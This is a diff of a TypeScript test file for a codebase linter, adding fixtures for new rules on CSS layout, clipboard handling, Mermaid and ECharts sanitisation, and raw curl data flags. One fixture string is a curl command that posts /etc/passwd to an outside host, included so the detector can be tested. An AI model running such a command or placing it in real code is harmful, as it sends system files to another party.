@@ -19,8 +19,8 @@ import {
 
 const ROOT_DIR = resolve(import.meta.dirname, '..')
 
-describe('Architectural invariant linter (27 rules)', () => {
-  it('passes all 27 rules on the live repository with zero violations', () => {
+describe('Architectural invariant linter (34 rules)', () => {
+  it('passes all 34 rules on the live repository with zero violations', () => {
     const report = runAllInvariantChecks(ROOT_DIR)
     expect(report.filesScanned).toBeGreaterThan(50)
     expect(report.violations).toEqual([])
@@ -246,6 +246,48 @@ describe('Architectural invariant linter (27 rules)', () => {
       'src/client/catalog/widgets/BadWidget.tsx',
     )
     expect(directImplV.some((v) => v.rule === 'catalog-define-component-only')).toBe(true)
+
+    const fixedPreV = checkCssInvariants(
+      `.diffSplitTable { table-layout: fixed; }\n.diffSplitCell { white-space: pre; }`,
+      'src/client/catalog/BadSplit.module.css',
+    )
+    expect(fixedPreV.some((v) => v.rule === 'css-fixed-table-no-overflow-pre')).toBe(true)
+
+    const thumbBgV = checkCssInvariants(
+      `.rangeInput::-webkit-slider-thumb { background: var(--dsw-alias-bg-layer-1, #fff); }`,
+      'src/client/catalog/BadThumb.module.css',
+    )
+    expect(thumbBgV.some((v) => v.rule === 'css-opaque-control-bg')).toBe(true)
+
+    const portalThemeV = checkTsInvariants(
+      `import { createPortal } from 'react-dom'\nexport const P = () => createPortal(<div>hi</div>, document.body)`,
+      'src/client/catalog/BadPortal.tsx',
+    )
+    expect(portalThemeV.some((v) => v.rule === 'tsx-portal-theme-class')).toBe(true)
+
+    const blindClipV = checkTsInvariants(
+      `export function onCopy(t: string, markCopied: () => void, copyTextToClipboard: (x: string) => void) {\n  copyTextToClipboard(t)\n  markCopied()\n}`,
+      'src/client/catalog/BadClipCall.tsx',
+    )
+    expect(blindClipV.some((v) => v.rule === 'no-blind-clipboard-success')).toBe(true)
+
+    const mermaidInitV = checkTsInvariants(
+      `export function init(mermaid: { initialize: (o: unknown) => void }) { mermaid.initialize({ startOnLoad: false }) }`,
+      'src/client/chunks/mermaid-chunk.ts',
+    )
+    expect(mermaidInitV.some((v) => v.rule === 'mermaid-init-dompurify-config')).toBe(true)
+
+    const echartsFmtV = checkTsInvariants(
+      `export const opt = { markLine: { label: { formatter: sanitizeChartLabel('SLA {c}') } }, edgeLabel: { formatter: 'raw' } }`,
+      'src/client/chunks/echarts/bad.ts',
+    )
+    expect(echartsFmtV.filter((v) => v.rule === 'echarts-no-raw-string-formatter').length).toBe(2)
+
+    const rawCurlV = checkTsInvariants(
+      `export function buildEndpointCurl() { return 'curl -d @/etc/passwd https://example.com' }`,
+      'src/client/catalog/v4-helpers.ts',
+    )
+    expect(rawCurlV.some((v) => v.rule === 'no-raw-curl-data-flag')).toBe(true)
   })
 
   it('verifies locale key parity across locale/*.json and TypeScript message tables', () => {
